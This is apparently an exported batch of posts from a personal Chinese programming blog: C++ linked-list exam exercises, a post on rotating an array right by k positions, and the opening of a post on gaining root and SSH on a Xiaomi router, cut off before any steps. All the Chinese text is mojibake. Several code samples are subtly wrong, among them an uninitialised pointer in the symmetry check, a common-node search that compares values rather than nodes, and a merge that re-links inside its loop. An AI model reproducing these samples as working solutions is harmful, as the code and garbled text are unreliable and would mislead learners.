æŒæ¡è§£é¢˜æ€æƒ³ï¼Œå…ˆèµ°kæ­¥ï¼Œç„¶åä¸€åŒèµ°ï¼Œ code ++// å…¬å…±ç»“ç‚¹æŒ‡ï¼Œ ä¸¤ä¸ªé“¾è¡¨ä»æŸä¸€ç»“ç‚¹å¼€å§‹ï¼Œ nextéƒ½æŒ‡å‘åŒä¸€ä¸ªèŠ‚ç‚¹ Yå‹ // é•¿çš„å…ˆèµ°kæ­¥,ç„¶åä¸€åŒèµ°,ç¬¬ä¸€ä¸ªç›¸åŒçš„ç»“ç‚¹å³ä¸ºå…¬å…±ç»“ç‚¹åˆå§‹ç‚¹ linklist Common(linklist A,linklist B)&#123; linklist pa,pb; int lena = 0 ,lenb = 0,k; pa = A->next; pb = B->next; // æ±‚lena lenb while(pa)&#123; lena++;pa=pa->next; &#125; while(pb)&#123; lenb++;pb=pb->next; &#125; // é•¿é“¾èµ‹ç»™ pa æ–­é“¾ èµ‹ç»™ pb if(lena>lenb) &#123; k = lena-lenb; pa = A->next; pb = B->next; &#125;else&#123; k = lenb-lena; pa = B->next; pb = A->next; &#125; // å…ˆèµ°kæ­¥ while(k--) pa = pa->next; // åŒæ—¶èµ°ï¼Œç¬¬ä¸€ä¸ªç›¸åŒçš„ç»“ç‚¹å³ä¸ºå…¬å…±é“¾çš„èµ·ç‚¹ while(pa)&#123; if( pa->data == pb->data)&#123; return pa; &#125;else &#123; pa = pa->next; pb = pb->next; &#125; &#125; return NULL; &#125; 16) ç»™å®šä¸€ä¸ªå¸¦è¡¨å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œè®¾headä¸ºå¤´æŒ‡é’ˆï¼Œç»“ç‚¹çš„ç»“æ„ä¸ºï¼ˆdataï¼Œnextï¼‰ï¼Œdataä¸ºæ•´å½¢å…ƒç´ ï¼Œnextä¸ºæŒ‡é’ˆï¼Œè¯•å†™å‡ºç®—æ³•ï¼šæŒ‰é€’å¢æ¬¡åºè¾“å‡ºå•é“¾è¡¨ä¸­å„ç»“ç‚¹çš„æ•°æ®å…ƒç´ ï¼Œå¹¶é‡Šæ”¾ç»“ç‚¹æ‰€å çš„å­˜å‚¨ç©ºé—´ (æ³¨æ„)ï¼šä¸å…è®¸ä½¿ç”¨æ•°ç»„ä½œä¸ºè¾…åŠ©ç©ºé—´ï¼‰ code ++// æ¯æ¬¡å¯»æ‰¾æœ€å°çš„ç»“ç‚¹è¾“å‡º O(n^2) // preè®°å½•çš„æ˜¯æœ€å°å€¼çš„å‰é©±ï¼Œpre->next æ—¢ä¸ºæœ€å°å€¼ç»“ç‚¹ // p ç›¸ç­‰äºè®°å½•çš„æ˜¯æœ€å°å€¼ç»“ç‚¹ // æ¯æ¬¡æ¯”è¾ƒçš„æ˜¯ p->next->data ä¸ pre->next->dataï¼› å³ æœ€å°å€¼åä¸€ä¸ªç»“ç‚¹ä¸æœ€å°å€¼ç»“ç‚¹ void fun(linklist &amp;Head)&#123; while(Head->next!=NULL)&#123; linklist pre,p,temp; pre = Head;p = pre->next; // å¯»æ‰¾æœ€å°å€¼ç»“ç‚¹ while(p->next!=NULL)&#123; // pre->nextä¸ºæœ€å°å€¼ç»“ç‚¹ï¼Œ p->nextä¸ºæœ€å°å€¼ç»“ç‚¹åç»§ä¸€ä¸ªç»“ç‚¹ if(p->next->data &lt; pre->next->data )&#123; pre = p; //updata &#125; p = p->next; &#125; cout&lt;&lt;pre->next->data&lt;&lt;endl;//è¾“å‡ºæœ€å°ç»“ç‚¹å€¼ // é‡Šæ”¾ç©ºé—´ï¼Œfreeï¼Œå¹¶ä¿è¯ä¸æ–­é“¾ p = pre->next; // pre->next = p->next;//ä¿æ­£ä¸æ–­é“¾ free(p); &#125; free(Head); &#125; 17) è®¾C={a1,b1,a2,b2â€¦,an,bn}ä¸ºçº¿æ€§è¡¨ï¼Œé‡‡ç”¨å¸¦å¤´ç»“ç‚¹çš„hcå•é“¾è¡¨å­˜æ”¾ï¼Œè®¾è®¡ä¸€ä¸ªå°±åœ°ç®—æ³•ï¼Œå°†å…¶æ‹†åˆ†ä¸ºä¸¤ä¸ªçº¿æ€§è¡¨ï¼Œä½¿å¾—A={a1,a2,â€¦,an} B={bn,â€¦,b2,b1} code ++// æ€æƒ³ï¼š Aå­˜æ”¾çš„æ˜¯å¥‡æ•°ä½ç½®ï¼Œå°¾æ’æ³• ï¼› Bå­˜æ”¾çš„æ˜¯å¶æ•°ä½ç½®ï¼Œå¤´æ’æ³• void fun2(linklist &amp;L)&#123; linklist la,lb,pl,pa,pb,temp; la = new node();lb = new node(); la->next = NULL,lb->next = NULL; pa = la;pb = lb; pl = L->next; int i = 0; while(pl)&#123; i++; temp = pl->next; // ä¿å­˜åç»§ç»“ç‚¹ï¼Œé˜²æ­¢æ–­é“¾ if(i%2==1)&#123; // Aé‡‡ç”¨å°¾æ’æ³• pl->next = NULL; // å¾ˆé‡è¦,ä¿è¯å°¾å¿…ä¸ºnull pa->next = pl; pa = pl; &#125;else&#123; // Bé‡‡ç”¨å¤´æ’æ³• pl->next = pb->next; pb->next = pl; &#125; pl = temp; &#125; Visit(la); Visit(lb); &#125; 18) åœ¨ä¸€ä¸ªé€’å¢æœ‰åºçš„çº¿æ€§è¡¨ä¸­ï¼Œæœ‰æ•°å€¼ç›¸åŒçš„å…ƒç´ å­˜åœ¨ã€‚è‹¥å­˜å‚¨æ–¹å¼ä¸ºå•é“¾è¡¨ï¼Œè®¾è®¡ç®—æ³•å»æ‰æ•°å€¼ç›¸åŒçš„å…ƒç´ ï¼Œä½¿è¡¨ä¸­ä¸å†æœ‰é‡å¤çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼ˆ7,10,10,21,30,42,42,42,51,70ï¼‰å°†å˜ä½œï¼ˆ7,10,21,30,42,51,70ï¼‰ code ++// é€’å¢æœ‰åºï¼Œ ç›¸åŒçš„æŒ¨ç€ï¼Œ ä¸€ä¸ªpre ä¸€ä¸ª p æ¯”è¾ƒp->nextæ˜¯å¦å’Œpre->next ç›¸åŒ // ç›¸åŒåˆ é™¤ pç»“ç‚¹ O(N) void delete_same(linklist &amp;L)&#123; linklist pre,p,temp; pre = L;p = pre->next; while(p->next!=NULL)&#123; temp = p->next; // é˜²æ­¢æ–­é“¾ if(p->next->data == pre->next->data)&#123; pre->next = p->next; free(p); &#125;else&#123; pre = p; &#125; p = temp; &#125; &#125; 19) è®¾Aå’ŒBæ˜¯ä¸¤ä¸ªå•é“¾è¡¨ï¼ˆå¸¦å¤´ç»“ç‚¹ï¼‰ï¼Œå…¶ä¸­å…ƒç´ é€’å¢æœ‰åºï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ä»Aå’ŒBä¸­å…¬å…±å…ƒç´ äº§ç”Ÿå•é“¾è¡¨Cï¼Œè¦æ±‚ä¸ç ´åA B çš„ç»“ç‚¹ code ++//æœ‰åº Cä¸­å…ƒç´ å³æ˜¯Açš„ä¹Ÿæ˜¯Bçš„ å°¾æ’å»ºé“¾è¡¨å³å¯ void fun3(linklist &amp;A,linklist &amp;B)&#123; linklist C,pa,pb,pc,temp; C = new node(); C->next = NULL; pc = C; pa = A->next,pb = B->next; while(pa &amp;&amp; pb)&#123; // å°æŠ˜åç§» if( pa->data &lt; pb->data)&#123; pa = pa->next; &#125;else if( pa->data > pb->data)&#123; pb = pb->next; &#125;else &#123; // ç›¸åŒå€¼ temp = new node(); temp->data = pa->data; pc->next = temp; /* å¦‚æœè¿™æ ·å†™å°±ä¼šå‡ºç°å›¾2çš„æƒ…å†µ pc->next = pa; pc = pa; */ pc = temp; // åŒæ—¶åç§» pa = pa->next; pb = pb->next; &#125; &#125; Visit(C); &#125; 20) å·²çŸ¥ä¸¤ä¸ªé“¾è¡¨Aå’ŒBåˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªé›†åˆï¼Œå…¶å…ƒç´ é€’å¢æ’åˆ—ã€‚ç»˜åˆ¶å‡½æ•°ï¼Œæ±‚Aä¸Bçš„äº¤é›†ï¼Œå¹¶å­˜æ”¾äºAé“¾è¡¨ä¸­ã€‚ code ++// æœ‰åºï¼Œ ç›¸åŒå­˜å…¥ï¼ŒABåŒæ—¶åç§»ï¼Œ ä¸åŒï¼Œå°è€…åç§» void fun4(linklist &amp;A,linklist &amp;B)&#123; linklist pa,pb,pre,temp; pa = A->next;pb = B->next; pre = A; // pre æŒ‡å‘A é‡æ„Aé“¾è¡¨ while(pa&amp;&amp;pb)&#123; // å°è€…åç§» if( pa->data &lt; pb->data)&#123; pa = pa ->next; &#125;else if(pa->data > pb->data)&#123; pb = pb->next; &#125;else&#123; // ç›¸ç­‰æ—¶å­˜å…¥ï¼Œ temp = new node(); temp->data = pa->data; pre->next = temp; pre = temp; pa = pa->next; pb = pb->next; &#125; &#125; &#125; 21) å¤´æŒ‡é’ˆåˆ†åˆ«ä¸ºla,lbçš„å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ä¸­ï¼Œç»“ç‚¹æŒ‰å…ƒç´ é€’å¢æœ‰åºæ’åˆ—ï¼Œå°†laå’Œlbä¸¤ä¸ªé“¾è¡¨åˆå¹¶æˆæŒ‰å…ƒç´ é€’å¢æœ‰åºçš„å•é“¾è¡¨ï¼Œè¦æ±‚ä¸å¦å¤–å¼€è¾Ÿç©ºé—´ï¼Œlaä½œä¸ºåˆå¹¶åçš„å•é“¾è¡¨çš„å¤´ç»“ç‚¹(951.Y19) code ++// å½’å¹¶ åŸç†ä¸ä¸Šé¢˜ä¸€è‡´ linklist Union(linklist la,linklist lb)&#123; linklist p,q,r,s; p = la->next,q = lb->next; r = la; // ré‡æ„la while( p &amp;&amp; q)&#123; if( p->data &lt; q->data)&#123; r->next = p; r = p; p = p->next; &#125;else if( p->data > q->data)&#123; r->next = q; r = q; q = q->next; &#125; else &#123; r->next = p; r = p; p = p->next; s = q->next; free(q); q = s; &#125; if(p) r->next = p; else if(q) r->next = q; &#125; return la; &#125; 22) ä¸¤ä¸ªæ•´æ•°åºåˆ—A=a1,a2,a3,â€¦,amå’ŒB=b1,b2,b3,â€¦,bnå·²ç»å­˜å…¥ä¸¤ä¸ªå•é“¾è¡¨ä¸­ï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåˆ¤æ–­åºåˆ—Bæ˜¯å¦æ˜¯åºåˆ—Açš„è¿ç»­å­åºåˆ— code ++/* * æ¨¡å¼åŒ¹é… é“¾è¡¨å®ç° ä¸€èˆ¬ç®—æ³• O(n^2) * å¸¦å¤´ç»“ç‚¹, å½“ç›¸åŒæ—¶ï¼ŒåŒæ—¶åç§»ï¼Œï¼Œ å½“ä¸ç›¸åŒæ—¶ï¼ŒBä»å¤´å¼€å§‹ï¼ŒAåç§»ä¸€ä¸ª * åˆ¤æ–­æ¡ä»¶ï¼š å¦‚æœBè·‘å®Œè¯´æ˜åŒ¹é…å®Œæˆï¼Œå¦åˆ™ä¸å­˜åœ¨ */ int Pattern(linklist A,linklist B)&#123; linklist pa,pb,pre; pa = A->next,pb = B->next; pre = A->next; while(pa&amp;&amp;pb)&#123; // ç›¸åŒï¼ŒåŒæ—¶åç§» if(pa->data == pb->data)&#123; pa = pa->next; pb = pb->next; &#125;else&#123; // ä¸ç›¸åŒ Aåç§» pre = pre->next; pa = pre; // Aåç§»ä¸€ä¸ªç»“ç‚¹åä»æ–°åŒ¹é…ï¼Œ pb = B->next; // Bä»å¤´å¼€å§‹ &#125; &#125; return pb == NULL? 1:0; // å¦‚æœpb è·‘å®Œè¯´æ˜åŒ¹é…å®Œæˆå­˜åœ¨ &#125; 23) è®¾è®¡ä¸€ä¸ªç®—æ³•ç”¨äºåˆ¤æ–­å¸¦å¤´ç»“ç‚¹çš„å¾ªç¯åŒé“¾è¡¨æ˜¯å¦å¯¹ç§° code ++/* * å¯¹ç§°æŒ‡ è®¾å„å…ƒç´ å€¼ a1,a2,...,an, åˆ™æœ‰ ai=an-i+1 ï¼Œ * å³æŒ‡ï¼š a1= an ï¼Œ a2= an-1 ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ * p ä»å¤´ï¼Œ q ä»å°¾ å½“ä¸¤ä¸ªç›¸åŒæ—¶ï¼Œpåç§»ï¼Œqå‰ç§»ï¼Œä¸€æ—¦ä¸åŒåˆ™breakï¼Œ * ç»“æŸæ¡ä»¶ p==q |ï½œp->next = q; */ int flag1(linklist L)&#123; linklist p,q; p = L->next; p = L->prior; int flag = 1; // åˆå§‹é»˜è®¤å¯¹ç§° while(p!=q &amp;&amp; p->next != q )&#123; if( p->data == q->data)&#123; p = p->next; q = q->prior; &#125;else &#123; flag = 0; break; &#125; &#125; return flag; &#125; 24) æœ‰ä¸¤ä¸ªå¾ªç¯å•é“¾è¡¨ï¼Œé“¾è¡¨å¤´æŒ‡é’ˆåˆ†åˆ«ä¸ºh1å’Œh2ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°å°†é“¾è¡¨h2é“¾æ¥åˆ°é“¾è¡¨h1ä¹‹åï¼Œè¦æ±‚é“¾æ¥åçš„é“¾è¡¨ä»ä¿æŒå¾ªç¯é“¾è¡¨å½¢å¼ã€‚ code ++/** * */ void fun5(linklist &amp;h1,linklist &amp;h2)&#123; linklist p,q; p = h1,q = h2; while(p->next != h1)&#123; p = p->next; &#125; while(q->next != h2)&#123; q = q->next; &#125; p->next = h2; q->next = h1; &#125; 25) è®¾æœ‰ä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å¾ªç¯å•é“¾è¡¨ï¼Œå…¶ç»“ç‚¹å€¼å‡ä¸ºæ­£æ•´æ•°ã€‚è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåå¤æ‰¾å‡ºå•é“¾è¡¨ä¸­ç»“ç‚¹å€¼æœ€å°çš„ç»“ç‚¹å¹¶è¾“å‡ºï¼Œç„¶åå°†è¯¥ç»“ç‚¹ä»ä¸­åˆ é™¤ï¼Œç›´åˆ°å•é“¾è¡¨ä¸ºç©ºä½ç½®ï¼Œå†åˆ é™¤è¡¨å¤´ç»“ç‚¹ code ++/** * åŒç¬¬16æ–¹æ³•ä¸€è‡´ï¼Œè¿™é‡Œä¸ºå¾ªç¯ç”µå•é“¾è¡¨ï¼Œåˆ¤ç©ºæ¡ä»¶éœ€æ”¹å˜ */ void Del_all(linklist &amp;L)&#123; linklist p,pre,minp,minpre; // æ²¡å¾ªç¯ä¸€æ¬¡Lå‡å°‘ä¸€ä¸ªç»“ç‚¹ï¼Œå½“L->nextä¸ºLæ—¶ï¼Œè¯´æ˜å…¨éƒ¨åˆ å®Œ while(L->next! = L)&#123; p = L->next;pre = L; minp = p, minpre = pre; // æ‰¾åˆ°æœ€å°ç»“ç‚¹ while(p->next != L)&#123; // å¾ªç¯å•é“¾è¡¨ // æ‰¾åˆ°æœ€å°ç»“ç‚¹ if( p->data &lt; minp->data)&#123; minp = p; minpre = pre; &#125;else&#123; pre = p; p = p->next; &#125; &#125; //free minp cout&lt;&lt;minp->data&lt;&lt;endl; minpre->next = minp->next; // åˆ é™¤èŠ‚ç‚¹ä¿è¯ä¸æ–­é“¾ free(minp); &#125; free(L); &#125; 26) å·²çŸ¥å¸¦å¤´ç»“ç‚¹å•é“¾è¡¨ï¼Œå¤´æŒ‡é’ˆlistï¼Œä¸æ”¹å˜é“¾è¡¨çš„å‰æä¸‹è®¾è®¡é«˜æ•ˆçš„ç®—æ³•ï¼ŒæŸ¥æ‰¾é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªä½ç½®ä¸Šçš„èŠ‚ç‚¹çš„å€¼(408.Y09) code ++/** * æŒæ¡æ€æƒ³å¾ˆé‡è¦ï¼ŒO(n)å†…å®ç° * ä¸¤ä¸ªæŒ‡é’ˆp,qï¼Œ på…ˆèµ°kæ­¥ï¼Œç„¶åp,qä¸€èµ·èµ°ï¼Œå½“påˆ°æ—¶ï¼Œqå³ä¸ºå€’æ•°ç¬¬kä¸ªä½ç½® * æœ‰å¯èƒ½ä¼šå‡ºç° k å¤§äºè¡¨é•¿çš„æƒ…å†µ,éœ€è¦åˆ¤æ–­ */ int fun6(linklist list,int k)&#123; linklist p,q; p = list->next; q = list->next; int i = 1; while(p)&#123; // p èµ°kæ­¥ if(i &lt;= k) &#123; i++; &#125; else&#123; // p,q åŒæ—¶èµ° q = q->next; &#125; p = p->next; &#125; // k > n if( i &lt; k)&#123; return 0; &#125; cout&lt;&lt;q->data&lt;&lt;endl; // æ­¤æ—¶q->dataå³ä¸ºå€’æ•°ç¬¬kä¸ªä½ç½® return 1; &#125; 27) å‡å®šé‡‡ç”¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ä¿å­˜å•è¯,å½“ä¸¤ä¸ªå•è¯æœ‰ç›¸åŒçš„åç¼€æ—¶,å¯å…±äº«ç›¸åŒçš„åç¼€å­˜å‚¨ç©ºé—´,ä¾‹å¦‚,â€œ loadingâ€å’Œ&quot; beingâ€çš„å­˜å‚¨æ˜ åƒå¦‚ä¸‹å›¾æ‰€ç¤º(408,Y12) è®¾str1å’Œstr2åˆ†åˆ«æŒ‡å‘ä¸¤ä¸ªå•è¯æ‰€åœ¨å•é“¾è¡¨çš„å¤´ç»“ç‚¹,é“¾è¡¨ç»“ç‚¹ç»“æ„ä¸º data nextè¯·è®¾è®¡ä¸€ä¸ªæ—¶é—´ä¸Šå°½å¯èƒ½é«˜æ•ˆçš„ç®—æ³•,æ‰¾å‡ºç”±str1å’Œstr2æ‰€æŒ‡å‘ä¸¤ä¸ªé“¾è¡¨å…±åŒåç¼€çš„èµ·å§‹ä½ç½®(å¦‚å›¾ä¸­å­—ç¬¦ä¸»æ‰€åœ¨ç»“ç‚¹çš„ä½ç½®p)ã€‚è¦æ±‚ code ++/** * æ±‚å…¬å…±åç¼€, æ±‚strlen(str1),strlen(str2); * æ±‚å·®kï¼Œ å¤§è€…å…ˆèµ°kæ­¥ï¼Œ ç„¶ååŒæ—¶èµ°ï¼Œç¬¬ä¸€ä¸ªç›¸ç­‰çš„å³ä¸ºå…¬å…±åç¼€èµ·ç‚¹ */ typedef struct link&#123; char data; link *next; &#125;node,*linklist; linklist Common2(linklist str1,linklist str2)&#123; linklist p,q,s,l; p = str1->next,q = str2->next; int len1 = 0,len2 = 0,k; while(p)&#123; p = p->next,len1++;&#125; // æ±‚str1é•¿åº¦ while(q)&#123; q = q->next,len2++;&#125; // æ±‚str2é•¿åº¦ // è®© sæŒ‡å‘çŸ­é“¾ ï¼›læŒ‡å‘é•¿é“¾ if(len1 &lt; len2)&#123; k = len2 - len1; s = str1->next; l = str2->next; &#125; else&#123; k = len1 - len2; s = str2->next; l = str1->next; &#125; while(k--)&#123; // æˆ–è€… for(int i = 0 ;i &lt; k ;i++) l = l->next; &#125; while(s&amp;&amp;l)&#123; if( s->data == l->data)&#123; return s; // è¿”å›sçš„èµ·å§‹ä½ç½®,æ­¤æ—¶s->dataå³ä¸ºç¬¬ä¸€ä¸ªç›¸åŒå…ƒç´ (ä¸å¸¦å¤´ç»“ç‚¹) /* æ­¤æ—¶è¿”å›çš„æ˜¯å¸¦å¤´ç»“ç‚¹çš„ linklist temp = new node(); temp->next = s; return temp; */ &#125;else&#123; s = s->next; l = l->next; &#125; &#125; return new node(); &#125; 28) ç”¨å•é“¾è¡¨ä¿å­˜mä¸ªæ•´æ•°,ç»“ç‚¹çš„ç»“æ„ä¸ºdata,link,|data|â‰¤n(nä¸ºæ­£æ•´æ•°)ã€‚ç°è¦æ±‚è®¾è®¡ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦å°½å¯èƒ½é«˜æ•ˆçš„ç®—æ³•,å¯¹äºé“¾è¡¨ä¸­dataçš„ç»å¯¹å€¼ç›¸ç­‰çš„ç»“ç‚¹,ä»…ä¿ç•™ç¬¬ä¸€æ¬¡å‡ºç°çš„ç»“ç‚¹è€Œåˆ é™¤å…¶ä½™ç»å¯¹å€¼ç›¸ç­‰çš„ç»“ç‚¹ã€‚ä¾‹å¦‚,è‹¥ç»™å®šçš„å•é“¾è¡¨headå¦‚ä¸‹:(408,Y15) code ++/** * åˆ é™¤é‡å¤ç»“ç‚¹,æ— åº * å»ºç«‹ä¸€ä¸ªmapç´¢å¼•,å­˜æ”¾data,å¦‚æœä¸å­˜åœ¨åˆ™,é“¾è¡¨è·³è¿‡ï¼Œå¦åˆ™åˆ é™¤è¿™ä¸ªç»“ç‚¹ï¼Œ * è¿™é‡Œæ±‚çš„æ˜¯|data| æ‰€ä»¥ç´¢å¼•ç”¨æ•°ç»„å³å¯ * æ—¶é—´O(m),ç©ºé—´O(n) * */ void fun6(linklist &amp;Head,int n)&#123; linklist p,pre; int vis[n+1]; // åˆå§‹åŒ–vis æ ‡è®°ä¸º0; memset(vis,0,sizeof(vis)); p = Head->next;pre = Head; while(p)&#123; // ç¬¬ä¸€æ¬¡å­˜åœ¨ï¼Œè·³è¿‡(ä¿ç•™) if(!vis[abs(p->data)])&#123; vis[abs(p->data)] = 1; pre = p; p = p->next; &#125;else&#123; //é‡å¤ pre->next = p->next; free(p); //é‡Šæ”¾ p = pre->next; // åˆ é™¤på,ä¿è¯ä¸æ–­é“¾ &#125; &#125; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç®—æ³•","slug":"æŠ€æœ¯å‘/ç®—æ³•","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.sizaif.com/tags/%E7%AE%97%E6%B3%95/"}],"author":"sizaif"},{"title":"å¾ªç¯å³ç§»Kä½é—®é¢˜çš„æ€è€ƒï¼Œå‡ ç§æ–¹æ³•çš„è§£å†³","slug":"å¾ªç¯å³ç§»Kä½é—®é¢˜çš„æ€è€ƒï¼Œå‡ ç§æ–¹æ³•çš„è§£å†³","date":"2021-08-11T14:01:57.000Z","updated":"2021-09-19T10:14:05.924Z","comments":true,"path":"posts/c1919217/","link":"","permalink":"https://www.sizaif.com/posts/c1919217/","excerpt":"","text":"@auther by sizaif å¾ªç¯å³ç§»Kä½é—®é¢˜ @TOC è¯•ç”¨é¡ºåºå­˜å‚¨ç»“æ„è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œä»…ç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹ï¼Œå®ç°å°†çº¿æ€§è¡¨ä¸­çš„ç»“ç‚¹å¾ªç¯å³ç§»kä½çš„è¿ç®—ï¼Œå¹¶åˆ†æï¼Œç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼ æ–¹æ³•ä¸€: modç§»ä½æ€æƒ³ å›¾ä¸€ï¼š /** * æ€è·¯: * è¿ç”¨modçš„æ€æƒ³, å°†nå¤åˆ¶æˆ2nçš„æ•°ç»„ å¦‚å›¾ä¸€æ‰€ç¤º; é‚£ä¹ˆå¾ªç¯æœ‰ç§» é€ƒä¸å‡º2nå†… * å³ç§»åçš„ç»“æœä¸ºï¼š (i+k) ç¼©åˆ°nå†…çš„è¯ å°±æ˜¯ (i+k)%n * å®é™…ä¸Šåªéœ€è¦ç”¨å¦å¤–ä¸€ä¸ªæ•°ç»„B[] æ¥å­˜å– åŸæ•°ç»„A[] çš„å†…å®¹ å³ B[i] = A[(i+n-k)%n]; * ä½†æ˜¯ è¿™æ ·çš„è¯ ç©ºé—´å¤æ‚åº¦å°±ä¸º O(n), æ—¶é—´å¤æ‚åº¦ä¸º O(n); */ for(int i = 0; i&lt; n ;i++) &#123; b[ i ] = a[ (i + n - k)%n]; &#125; æ–¹æ³•ä¸€plusï¼š ä¼šå‡ºç°å¦‚ä¸‹çš„æƒ…å†µï¼š æ”¹è¿›-æœ€å¤§å…¬çº¦æ•°GCD /** * å°†æ–¹æ³•åŠ ä»¥æ”¹è¿› * å°†å…¶æŒ‰ç…§ k æ­¥è¿›è¡Œåˆ†ç»„ï¼Œ ç±»ä¼¼äºå¸Œå°”æ’åºçš„æ€æƒ³ï¼Œ æ¯é—´éš”kçš„ä½ç½®æ„æˆä¸€ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ * çš„æ‰€è°“å³ç§»åªæ˜¯åœ¨è¿™æ¯ä¸€ç»„ä¸­ç»„å†…ç§»åŠ¨ï¼Œç±»ä¼¼ä¸‹å›¾ * é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ç¡®å®šæˆ‘ä»¬è¦å¾ªç¯å‡ æ¬¡å°±å¯ä»¥æ‰¾åˆ°ç­”æ¡ˆå‘¢ï¼Ÿ * ç­”æ¡ˆæ˜¯ç¡®å®šçš„åªéœ€è¦æ‰¾åˆ°ä»–ä»¬çš„ gcd ï¼Œ * ç„¶åè®°å½•ä¸‹å¼€å§‹ä½ç½®ï¼Œé‡‡ç”¨ åæ±‚xçš„æ–¹æ³• å³ ï¼ˆx+k)%n = t, t,n,kå·²çŸ¥ æ±‚æœªçŸ¥æ•°x * x = (t+n-k)%n; å½“ x == å¼€å§‹ä½ç½®æ—¶åœæ­¢,è¿›å…¥ä¸‹ä¸€ç»„ * æ—¶é—´å¤æ‚åº¦O(n) , ç©ºé—´å¤æ‚åº¦O(1) */ int Gcd(int a,int b)&#123; return b==0?a:Gcd(b,a%b); // è¾—è½¬ç›¸é™¤æ³•æ±‚GCD &#125; void fun(int a[],int n,int k)&#123; int gcd = Gcd(n,k); int t,temp,j; for(int i = 0 ;i &lt; gcd; i++) &#123; temp = a[i]; // è®°å½•å¼€å§‹ä½ç½® t = i; while(1)&#123; j = ( t + n - k )%n; if( j == i) break; // å¾ªç¯åˆ°è‡ªå·±è·³å‡º a[t] = a[j]; t = j; &#125; a[t] = temp; &#125; &#125; ==éªŒè¯ï¼š== æ–¹æ³•äºŒï¼šå€’å™ç§»ä½ /** ``````````````````````åˆ†å‰²çº¿`````````````````````````````` * å°†ç©ºé—´å¤æ‚åº¦é™åˆ°O(1) * æ‰€ä»¥è€ƒè™‘åªç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹çš„ä¼˜åŒ–æ–¹æ³• * * ç¬¬ä¸€ç§ å¾ªç¯kæ¬¡ï¼Œ ä»åé¢å¼€å§‹ç§»åŠ¨ï¼Œ ç©ºé—´å¤æ‚åº¦ä¸ºO(1) ,ä½†æ—¶é—´å¤æ‚åº¦ä¸º O(kn) * */ for(int i = 0; i &lt; k; i++)&#123; int temp = a[n - 1]; for(int j = n-1; j > 0; j --)&#123; a[j] = a[j-1]; &#125; a[0] = temp; &#125; æ–¹æ³•ä¸‰ï¼šé€’å½’è°ƒç”¨ /** ``````````````````````åˆ†å‰²çº¿`````````````````````````````` * å°†ç©ºé—´å¤æ‚åº¦é™åˆ°O(1) * æ‰€ä»¥è€ƒè™‘åªç”¨ä¸€ä¸ªè¾…åŠ©ç»“ç‚¹çš„ä¼˜åŒ–æ–¹æ³• * * ç¬¬äºŒç§ é‡‡ç”¨é€’å½’åè½¬çš„æ–¹å¼ ç©ºé—´å¤æ‚åº¦ä¸ºO(1) ,æ—¶é—´å¤æ‚åº¦ä¸º O(n) * å…ˆé€’å½’åè½¬å‰ ï¼ˆn-k)ä½ åœ¨åè½¬å kä½ æœ€å å…¨éƒ¨åè½¬ */ void reverse(int a[],int l,int r)&#123; for(; l &lt; r; l++,r--) &#123; int temp = a[l]; a[l] = a[r]; a[r] = temp; &#125; &#125; int main()&#123; reverse(a,0,n-k-1); reverse(a,n-k,n-1); reverse(a,0,n-1); return 0; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç®—æ³•","slug":"æŠ€æœ¯å‘/ç®—æ³•","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.sizaif.com/tags/%E7%AE%97%E6%B3%95/"}],"author":"sizaif"},{"title":"å°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨è§£é”rootä¸SSHæ–¹æ³•","slug":"å°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨è§£é”rootä¸SSHæ–¹æ³•","date":"2021-08-11T14:01:56.000Z","updated":"2021-08-14T14:15:24.810Z","comments":true,"path":"posts/e5a81842/","link":"","permalink":"https://www.sizaif.com/posts/e5a81842/","excerpt":"","text":"@auther by sizaif @TOC å‰æœŸå‡†å¤‡ å°ç±³è·¯ç”±å™¨ x1; å®½å¸¦çº¿x1(è¿æ¥è·¯ç”±å™¨å’Œç”µè„‘), æ€è·¯ å› ä¸ºå°ç±³é’æ˜¥ç‰ˆè·¯ç”±å™¨æ²¡æœ‰USBæ’å£,åªèƒ½é€šè¿‡å…ˆåˆ·å¼€å‘ç‰ˆ,å†é€šè¿‡å¼€å‘ç‰ˆæ¥å¼€å¯ROOTå’ŒSSH ä¸‹è½½å¼€å‘ç‰ˆæœ¬ROMåŒ… 